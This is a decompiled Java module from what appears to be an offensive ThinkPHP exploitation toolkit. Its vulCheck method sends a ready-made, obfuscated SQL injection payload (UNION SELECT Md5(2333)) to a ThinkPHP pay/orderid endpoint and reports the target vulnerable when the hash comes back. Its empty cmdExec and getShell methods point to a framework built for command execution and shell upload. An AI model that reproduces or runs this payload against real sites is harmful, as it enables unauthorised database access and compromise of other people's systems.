/*    */ package dylan.exp;
/*    */ 
/*    */ import dylan.model.BaseExp;
/*    */ import dylan.model.Response;
/*    */ import dylan.tools.HttpTool;
/*    */ import java.util.HashMap;
/*    */ 
/*    */ public class tp_pay_orderid_sqli
/*    */   implements BaseExp {
/* 10 */   private String results = null;
/* 11 */   private final HashMap<String, String> property = new HashMap<>();
/*    */ 
/*    */   
/*    */   public String vulCheck(String url) {
/* 15 */     url = url + "/index.php?s=/home/pay/index/orderid/1%27)UnIoN/**/All/**/SeLeCT/**/Md5(2333)--+";
/* 16 */     Response response = HttpTool.get(url, this.property);
/* 17 */     if (response.getText().contains("56540676a129760a")) {
/* 18 */       this.results = "[+] 目标存在" + getClass().getSimpleName() + "漏洞";
/* 19 */       return this.results;
/*    */     } 
/* 21 */     if (response.getError() != null) {
/* 22 */       this.results = "[-] 检测漏洞" + getClass().getSimpleName() + "失败， " + response.getError();
/* 23 */       return this.results;
/*    */     } 
/* 25 */     this.results = "[-] 目标不存在" + getClass().getSimpleName() + "漏洞";
/* 26 */     return this.results;
/*    */   }
/*    */ 
/*    */   
/*    */   public String cmdExec(String url, String cmd) {
/* 31 */     return null;
/*    */   }
/*    */ 
/*    */   
/*    */   public String getShell(String url, String fileName, String content) {
/* 36 */     return null;
/*    */   }
/*    */ }


/* Location:              C:\Users\zyh\Desktop\ThinkPHP.V2.3.by蓝鲸.jar!\dylan\exp\tp_pay_orderid_sqli.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */